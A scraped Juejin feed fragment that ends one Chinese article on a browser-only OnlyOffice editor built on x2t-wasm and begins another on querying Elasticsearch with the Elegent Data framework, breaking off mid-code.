    <span class="hljs-keyword">const</span> cached = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getCachedWasm</span>(url);
    <span class="hljs-keyword">if</span> (cached) {
      <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Response</span>(cached, {
        <span class="hljs-attr">headers</span>: { <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/wasm'</span> }
      });
    }
    
    <span class="hljs-comment">// 缓存未命中，从网络加载并缓存</span>
    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">originalFetch</span>(input);
    <span class="hljs-keyword">const</span> arrayBuffer = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">arrayBuffer</span>();
    <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">cacheWasm</span>(url, arrayBuffer);
    
    <span class="hljs-keyword">return</span> response;
  };
}
</code></pre>
<h2 data-id="heading-16">使用示例</h2>
<h3 data-id="heading-17">基本使用</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { createEditorView } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/onlyoffice-comp/lib/x2t'</span>;
<span class="hljs-keyword">import</span> { editorManager } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/onlyoffice-comp/lib/editor-manager'</span>;

<span class="hljs-comment">// 创建编辑器视图</span>
<span class="hljs-keyword">await</span> <span class="hljs-title function_">createEditorView</span>({
  <span class="hljs-attr">file</span>: fileObject,        <span class="hljs-comment">// File 对象（可选）</span>
  <span class="hljs-attr">fileName</span>: <span class="hljs-string">'document.xlsx'</span>, <span class="hljs-comment">// 文件名</span>
  <span class="hljs-attr">isNew</span>: <span class="hljs-literal">false</span>,            <span class="hljs-comment">// 是否新建文档</span>
  <span class="hljs-attr">readOnly</span>: <span class="hljs-literal">false</span>,        <span class="hljs-comment">// 是否只读</span>
  <span class="hljs-attr">lang</span>: <span class="hljs-string">'zh'</span>,             <span class="hljs-comment">// 界面语言</span>
});

<span class="hljs-comment">// 导出文档</span>
<span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> editorManager.<span class="hljs-title function_">export</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'导出成功:'</span>, result);
</code></pre>
<h3 data-id="heading-18">React组件集成</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// src/app/excel/page.tsx</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">ExcelPageContent</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> [readOnly, setReadOnly] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">false</span>);
  <span class="hljs-keyword">const</span> [currentLang, setCurrentLang] = useState&lt;<span class="hljs-string">'zh'</span> | <span class="hljs-string">'en'</span>&gt;(<span class="hljs-string">'zh'</span>);
  
  <span class="hljs-comment">// 上传文档</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleView</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">fileName: <span class="hljs-built_in">string</span>, file?: File</span>) =&gt; {
    <span class="hljs-keyword">await</span> <span class="hljs-title function_">initializeOnlyOffice</span>();
    <span class="hljs-keyword">await</span> <span class="hljs-title function_">createEditorView</span>({
      file,
      fileName,
      <span class="hljs-attr">isNew</span>: !file,
      readOnly,
      <span class="hljs-attr">lang</span>: currentLang,
    });
  };
  
  <span class="hljs-comment">// 导出文档</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleExport</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> editorManager.<span class="hljs-title function_">export</span>();
    <span class="hljs-keyword">const</span> buffer = <span class="hljs-keyword">await</span> <span class="hljs-title function_">convertBinToDocument</span>(
      result.<span class="hljs-property">binData</span>, 
      result.<span class="hljs-property">fileName</span>,
      <span class="hljs-variable constant_">FILE_TYPE</span>.<span class="hljs-property">XLSX</span>, 
      result.<span class="hljs-property">media</span>
    );
    <span class="hljs-comment">// 下载文件...</span>
  };
  
  <span class="hljs-comment">// 切换只读模式</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">toggleReadOnly</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-keyword">const</span> newReadOnly = !readOnly;
    <span class="hljs-title function_">setReadOnly</span>(newReadOnly);
    <span class="hljs-keyword">await</span> editorManager.<span class="hljs-title function_">setReadOnly</span>(newReadOnly);
  };
  
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
      {/* UI组件 */}
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
}
</code></pre>
<h2 data-id="heading-19">项目结构</h2>
<pre><code class="hljs language-csharp" lang="csharp">mvp-onlyoffice/
├── src/
│   ├── app/              <span class="hljs-meta"># Next.js 应用页面</span>
│   │   ├── excel/        <span class="hljs-meta"># Excel 编辑器页面</span>
│   │   ├── docs/         <span class="hljs-meta"># Word 编辑器页面</span>
│   │   └── ppt/          <span class="hljs-meta"># PowerPoint 编辑器页面</span>
│   ├── onlyoffice-comp/  <span class="hljs-meta"># OnlyOffice 组件库</span>
│   │   └── lib/
│   │       ├── editor-manager.ts  <span class="hljs-meta"># 编辑器管理器</span>
│   │       ├── x2t.ts             <span class="hljs-meta"># 文档转换模块</span>
│   │       ├── eventbus.ts        <span class="hljs-meta"># 事件总线</span>
│   │       └── utils.ts            <span class="hljs-meta"># 工具函数</span>
│   └── components/       <span class="hljs-meta"># 通用组件</span>
├── <span class="hljs-keyword">public</span>/               <span class="hljs-meta"># 静态资源</span>
│   ├── web-apps/         <span class="hljs-meta"># OnlyOffice Web 应用资源</span>
│   ├── sdkjs/            <span class="hljs-meta"># OnlyOffice SDK 资源</span>
│   └── wasm/             <span class="hljs-meta"># WebAssembly 转换器</span>
└── onlyoffice-x2t-wasm/  <span class="hljs-meta"># x2t-wasm 源码</span>
</code></pre>
<h2 data-id="heading-20">部署方案</h2>
<h3 data-id="heading-21">Vercel一键部署</h3>
<p>项目已配置静态导出，可直接部署到Vercel：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 安装依赖</span>
npm install

<span class="hljs-comment"># 构建项目</span>
npm run build

<span class="hljs-comment"># Vercel 会自动检测并部署</span>
</code></pre>
<p>🌐 <strong>在线演示</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fmvp-onlyoffice.vercel.app%2F" target="_blank" title="https://mvp-onlyoffice.vercel.app/" ref="nofollow noopener noreferrer">mvp-onlyoffice.vercel.app/</a></p>
<h3 data-id="heading-22">静态文件部署</h3>
<p>项目支持静态导出，构建后的文件可部署到任何静态托管服务：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 构建静态文件</span>
npm run build

<span class="hljs-comment"># 输出目录: out/</span>
<span class="hljs-comment"># 可直接部署到 GitHub Pages、Netlify、Nginx 等</span>
</code></pre>
<h2 data-id="heading-23">技术优势总结</h2>













































<table><thead><tr><th>特性</th><th>传统方案</th><th>本方案</th></tr></thead><tbody><tr><td>数据安全</td><td>❌ 需要上传服务器</td><td>✅ 完全本地处理</td></tr><tr><td>部署成本</td><td>❌ 需要后端服务</td><td>✅ 纯静态部署</td></tr><tr><td>格式支持</td><td>⚠️ 有限格式</td><td>✅ 30+种格式</td></tr><tr><td>离线使用</td><td>❌ 需要网络</td><td>✅ 完全离线</td></tr><tr><td>性能优化</td><td>⚠️ 依赖网络</td><td>✅ IndexedDB缓存</td></tr><tr><td>国际化</td><td>⚠️ 需额外配置</td><td>✅ 内置支持</td></tr><tr><td>权限控制</td><td>⚠️ 复杂实现</td><td>✅ 简单API</td></tr></tbody></table>
<h2 data-id="heading-24">技术原理</h2>
<h3 data-id="heading-25">使用x2t-wasm替代OnlyOffice服务</h3>
<p>传统OnlyOffice集成需要：</p>
<ol>
<li>搭建OnlyOffice Document Server</li>
<li>配置文档转换服务</li>
<li>处理文档上传下载</li>
<li>管理服务器资源</li>
</ol>
<p>本方案通过WASM技术：</p>
<ol>
<li>在浏览器中直接运行x2t转换引擎</li>
<li>使用虚拟文件系统处理文档</li>
<li>完全客户端化，无需服务器</li>
</ol>
<h3 data-id="heading-26">参考项目</h3>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FQihoo360%2Fse-office" target="_blank" title="https://github.com/Qihoo360/se-office" ref="nofollow noopener noreferrer">Qihoo360/se-office</a> - se-office扩展，提供基于开放标准的全功能办公生产力套件</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fcryptpad%2Fonlyoffice-x2t-wasm" target="_blank" title="https://github.com/cryptpad/onlyoffice-x2t-wasm" ref="nofollow noopener noreferrer">cryptpad/onlyoffice-x2t-wasm</a> - CryptPad WebAssembly文件转换工具</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Franuts%2Fdocument" target="_blank" title="https://github.com/ranuts/document" ref="nofollow noopener noreferrer">ranuts/document</a> - 参考静态资源实现</li>
</ul>
<h2 data-id="heading-27">开源地址</h2>
<p>🔗 <strong>GitHub仓库</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fyour-username%2Fmvp-onlyoffice" target="_blank" title="https://github.com/your-username/mvp-onlyoffice" ref="nofollow noopener noreferrer">mvp-onlyoffice</a></p>
<h2 data-id="heading-28">总结</h2>
<p>本项目提供了一个完整的纯前端OnlyOffice集成方案，通过WASM技术实现了文档格式转换的本地化，结合React和OnlyOffice SDK，打造了一个功能完善、性能优秀的文档编辑器。</p>
<p><strong>核心亮点</strong>：</p>
<ul>
<li>🚀 纯前端架构，无需后端服务</li>
<li>🔒 数据完全本地化，保护隐私安全</li>
<li>⚡ 基于WASM的高性能转换</li>
<li>🌏 内置国际化支持</li>
<li>📦 支持导入导出</li>
<li>🔐 灵活的权限控制</li>
</ul>
<p>欢迎Star和Fork，一起推动前端Office编辑技术的发展！</p>
<hr/>
<p><strong>相关阅读</strong>：</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fapi.onlyoffice.com%2Fzh-CN%2Fdocs%2Fdocs-api%2Fusage-api%2Fconfig%2Fdocument%2F" target="_blank" title="https://api.onlyoffice.com/zh-CN/docs/docs-api/usage-api/config/document/" ref="nofollow noopener noreferrer">OnlyOffice API 文档</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwebassembly.org%2F" target="_blank" title="https://webassembly.org/" ref="nofollow noopener noreferrer">WebAssembly 官方文档</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fnextjs.org%2Fdocs%2Fapp%2Fbuilding-your-application%2Fdeploying%2Fstatic-exports" target="_blank" title="https://nextjs.org/docs/app/building-your-application/deploying/static-exports" ref="nofollow noopener noreferrer">Next.js 静态导出</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[面试日志elk之ES数据查询与数据同步]]></title>    <link>https://juejin.cn/post/7575425466904739903</link>    <guid>https://juejin.cn/post/7575425466904739903</guid>    <pubDate>2025-11-23T08:36:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575425466904739903" data-draft-id="7575442779038793770" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="面试日志elk之ES数据查询与数据同步"/> <meta itemprop="keywords" content="后端,面试,架构"/> <meta itemprop="datePublished" content="2025-11-23T08:36:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="360_go_php"/> <meta itemprop="url" content="https://juejin.cn/user/2436173498956695"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            面试日志elk之ES数据查询与数据同步
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2436173498956695/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    360_go_php
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T08:36:47.000Z" title="Sun Nov 23 2025 08:36:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读11分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>​</p>
<h2 data-id="heading-0">1.ES持久层技术<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e71b2815054e41c3a5854e4d2a53f1ea~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMzYwX2dvX3BocA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764491806&amp;x-signature=jlTZBLahH27cIf3s5ZhjweZlzgY%3D" alt="" loading="lazy"/><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/>​编辑</h2>
<h3 data-id="heading-1">1.1 ES应用场景<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3b3f551db8dd4c08b1dfbaa0ad5a3201~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMzYwX2dvX3BocA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764491806&amp;x-signature=0BUiIMFn0j%2B1rVYQAvsEZ8InnAA%3D" alt="" loading="lazy"/><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/>​编辑</h3>
<p><strong>1全文搜索</strong></p>
<p>Elasticsearch可以用于实现全文搜索功能，例如搜索引擎、文档管理系统、电子商务搜索等。它支持复杂的查询语句、中文分词、近似搜索等功能，可以快速地搜索并返回匹配的结果。<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d3938e6b79c648f2ae9599c9e4f88772~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMzYwX2dvX3BocA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764491806&amp;x-signature=T8yNTzVvHw24z45TTIZ%2FnYVi9%2FE%3D" alt="" loading="lazy"/><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/>​编辑</p>
<p><strong>2日志分析</strong></p>
<p>Elasticsearch可以用于实现实时日志分析，例如监控系统、异常日志分析等。它可以快速地索引和搜索大量的日志数据，并支持聚合、可视化等功能，可以帮助用户快速定位和解决问题。 <strong>ELK</strong></p>
<p><strong>3业务分析</strong></p>
<p>Elasticsearch可以用于实现业务分析，例如企业数据分析、市场调研等。它可以对海量数据进行搜索、聚合和分析，支持多种数据格式和数据源，例如数据库、日志、网页等，可以帮助用户了解业务情况、市场趋势等。</p>
<p><strong>4搜索推荐</strong></p>
<p>Elasticsearch可以用于实现搜索推荐功能，例如电商搜索推荐、新闻推荐等。它可以根据用户的搜索历史、行为等数据，进行个性化推荐，并支持实时更新和调整推荐结果。</p>
<p><strong>5地理信息系统</strong></p>
<p>Elasticsearch可以用于实现地理信息系统，例如地图搜索、位置分析等。它支持地理坐标索引和查询，可以快速地搜索和聚合地理数据，并支持地图可视化等功能。 <strong>GEO</strong></p>
<h3 data-id="heading-2">1.2 Elasticsearch持久层技术盘点</h3>
<ol>
<li><strong>Elasticsearch官方提供的Java客户端</strong>： Elasticsearch官方提供了Java客户端（<strong>High-Level REST Client和Low-Level REST Client</strong>），可以通过Java代码与ES进行交互。这些客户端提供了各种API和方法，用于执行索引、搜索、更新、删除等操作，并且支持与ES集群的连接和通信。</li>
<li><strong>Spring Data Elasticsearch</strong>： Spring Data Elasticsearch是SpringData框架提供的一个模块，用于简化与Elasticsearch的集成和操作。对于比较简单的查询操作，Spring Data Elasticsearch可以比较简便地实现查询功能，但是对于比较复杂的查询，<strong>Spring Data Elasticsearch使用起来依然比较繁琐</strong>，而且它的版本更新速度跟不上 Elasticsearch官方版本的更新速度，所以企业应用较少。</li>
<li><strong>Jest</strong>： Jest是一个开源的Java HTTP客户端库，专门用于与Elasticsearch进行交互。它提供了一组易于使用的API和方法，可以执行索引、搜索、更新、删除等操作。Jest具有良好的可扩展性和灵活性，并且支持与ES集群的连接和通信。</li>
<li><strong>Transport Client</strong>（已弃用）： Transport Client是Elasticsearch早期版本中提供的Java客户端，自Elasticsearch 7.0版本起，<strong>Transport Client已被官方弃用</strong>。</li>
<li><strong>Elegent Data Elasticsearch</strong>：Elegent Data Elasticsearch是Elegent Data的子框架。Elegent Data是传智教育研究院开发的一款针对NoSQL的持久层框架。Elegent Data Elasticsearch 改变了大家头疼的Elasticsearch持久化操作的难题。因为它可以<strong>让用户按照myBatisPlus的风格来操作Elasticsearch</strong>，轻松上手。</li>
</ol>
<p>使用Elegent Data Elasticsearch框架，可以让你的程序更优雅。我们选择Elegent Data Elasticsearch框架。</p>
<h3 data-id="heading-3">1.3 Elegent Data</h3>
<h4 data-id="heading-4">1.3.1 Elegent Data 简介</h4>
<p>Elegent Data是一个优雅的NoSQL数据持久层框架。</p>
<p>（1）使用这个组件可以让你更轻松、更优雅地在项目中操作 Elasticsearch 等NoSQL数据库，风格类似于MyBatisPlus，让你更专注业务代码的开发。</p>
<p>（2）支持用户自行扩展。</p>
<p>开源项目地址 ：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Fchuanzhiliubei%2Felegent-data" title="https://gitee.com/chuanzhiliubei/elegent-data" target="_blank" ref="nofollow noopener noreferrer">gitee.com/chuanzhiliu…</a></p>
<p>我们看一下Elegent Data框架的系统架构图：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e56b9e8f6cc44070b5a8a06ba7b073bb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMzYwX2dvX3BocA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764491806&amp;x-signature=3J7j7sFyDBiZWTDsJIXsqHnLAIE%3D" alt="" loading="lazy"/>​</p>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/>编辑</p>
<h4 data-id="heading-5">1.3.2 Elegent Data Elasticsearch快速入门</h4>
<p>（1）在pom文件中添加依赖</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>cn.elegent.data<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>elegent-data-elasticsearch7<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>（2）application.yml添加配置</p>
<pre><code class="hljs language-less" lang="less">spring:
  elasticsearch:
    <span class="hljs-attribute">rest</span>:
      <span class="hljs-attribute">uris</span>: <span class="hljs-attribute">http</span>:<span class="hljs-comment">//127.0.0.1:9201</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>（3）创建DTO</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Data</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderDTO</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-title class_">Long</span> id;<span class="hljs-comment">//id</span>

    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> orderNo;<span class="hljs-comment">//订单编号</span>

    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> innerCode;<span class="hljs-comment">//机器编号</span>

    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> addr;<span class="hljs-comment">//点位地址</span>
  
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">Long</span> skuId;<span class="hljs-comment">//商品id</span>

    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> skuName;<span class="hljs-comment">//商品名称</span>
  
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">Integer</span> status;<span class="hljs-comment">//订单状态:0-创建;1-支付完成;2-出货成功;3-出货失败;</span>

    <span class="hljs-keyword">private</span> <span class="hljs-title class_">Integer</span> amount;<span class="hljs-comment">//支付金额</span>

    <span class="hljs-keyword">private</span> <span class="hljs-title class_">Integer</span> bill;<span class="hljs-comment">//分账金额</span>

    <span class="hljs-keyword">private</span> <span class="hljs-title class_">Integer</span> price;<span class="hljs-comment">//商品金额</span>
  
}
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>（4）创建服务类</p>
<pre><code class="hljs language-scala" lang="scala"><span class="hljs-meta">@Component</span>
public <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OrderEsService</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Elasticsearch7DataService&lt;OrderDTO&gt;</span> </span>{

}
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>（5）创建Controller类，测试分页查询、列表查询、增加、删除、修改操作。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping</span>(<span class="hljs-string">"/order"</span>)
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderController</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">OrderEsService</span> orderEsService;


    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">"/page"</span>)
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Pager</span>&lt;<span class="hljs-title class_">OrderDTO</span>&gt; <span class="hljs-title function_">findPage</span>(<span class="hljs-params"/>){
        <span class="hljs-title class_">ElegentQueryWapper</span> elegentQueryWapper=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ElegentQueryWapper</span>();
        elegentQueryWapper.<span class="hljs-title function_">from</span>(<span class="hljs-string">"order"</span>)
                .<span class="hljs-title function_">eq</span>(<span class="hljs-string">"status"</span>,<span class="hljs-string">"1"</span>)
                .<span class="hljs-title function_">eq</span>(<span class="hljs-string">"sku_name"</span>,<span class="hljs-string">"统一奶茶"</span>);
        <span class="hljs-keyword">return</span>  orderEsService.<span class="hljs-title function_">page</span>(elegentQueryWapper,<span class="hljs-number">1</span>,<span class="hljs-number">10</span>);
    }

    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">"/list"</span>)
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">OrderDTO</span>&gt; <span class="hljs-title function_">findList</span>(<span class="hljs-params"/>){
        <span class="hljs-title class_">ElegentQueryWapper</span> elegentQueryWapper=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ElegentQueryWapper</span>();
        elegentQueryWapper.<span class="hljs-title function_">from</span>(<span class="hljs-string">"order"</span>);
        <span class="hljs-keyword">return</span>  orderEsService.<span class="hljs-title function_">list</span>(elegentQueryWapper);
    }


    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">"/statistics"</span>)
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">StatisticsVo</span>&gt; <span class="hljs-title function_">findStatistics</span>(<span class="hljs-params"/>){
